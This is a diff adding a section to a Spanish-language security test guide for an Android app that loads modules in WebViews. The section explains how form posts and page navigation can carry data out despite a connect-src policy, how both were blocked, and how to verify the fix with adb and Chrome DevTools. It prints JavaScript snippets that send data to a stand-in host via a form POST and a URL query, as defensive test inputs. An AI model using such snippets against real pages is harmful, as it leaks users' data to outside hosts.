@@ -440,6 +440,55 @@ examenes: Refused to connect to 'http://127.0.0.1:8095/...' because it violates 
 following Content Security Policy directive: "connect-src 'self'"
 ```
 
+#### Las otras dos salidas, y cómo probarlas de verdad
+
+`connect-src` cubre el `fetch`, pero **no es la única forma de sacar datos de una página**. Hay
+dos más, y las dos estaban abiertas hasta el **2026-09-07**:
+
+| salida | qué la gobierna | ¿hereda de `default-src`? |
+|---|---|---|
+| **`<form action="https://ajeno" method="post">`** | `form-action` | **no** — por eso faltaba |
+| **`window.location = 'https://ajeno/?d=…'`** | **ninguna directiva existe** | — |
+
+La primera se cerró con `form-action 'self'` en la cadena compartida; la segunda con
+`ShouldOverrideUrlLoading` en `BundleServerClient`, que rechaza todo host que no sea el del
+módulo y **lo loguea**.
+
+**Y esta prueba SÍ se puede correr entera, sin sonda y sin tocar el módulo**, porque en Debug el
+WebView es inspeccionable. Con el escenario arriba y un módulo abierto:
+
+```bash
+adb shell cat /proc/net/unix | grep -o 'webview_devtools_remote_[0-9]*' | sort -u
+adb forward tcp:9222 localabstract:webview_devtools_remote_<pid>
+```
+
+Después, `chrome://inspect` en Chrome de escritorio muestra los dos WebViews —el módulo en
+`https://<módulo>.gnothi.local/app/` y la cáscara en `file:///android_asset/ui.html`— y desde su
+consola:
+
+```javascript
+// intento A · el formulario
+var f = document.createElement('form');
+f.method = 'POST'; f.action = 'https://example.com/collect';
+document.body.appendChild(f); f.submit();
+
+// intento B · la navegación
+window.location = 'https://example.com/?d=lo-que-sea';
+```
+
+**Qué tenés que ver.** La página **no** se mueve de su propio origen, y en el log:
+
+```
+modulo : examenes: Sending form data to 'https://example.com/collect' violates the following
+         Content Security Policy directive: "form-action 'self'". The request has been blocked.
+gnothi : examenes: navigation refused to https://example.com -- outside its own origin
+```
+
+> **MEDIDO el 2026-09-07, antes y después.** Sin el arreglo los dos intentos **salían**: la
+> página terminaba en `https://example.com/collect` y el servidor contestaba **405**, o sea que
+> el POST llegó de verdad a la red. Y la navegación terminaba en
+> `https://example.com/?d=datos-de-sonia`. No era un agujero teórico.
+
 ### P7 · Las consultas del módulo llegan al Host
 
 Pasa sola al dar de alta: Gnothi comprueba el módulo apenas lo instala.
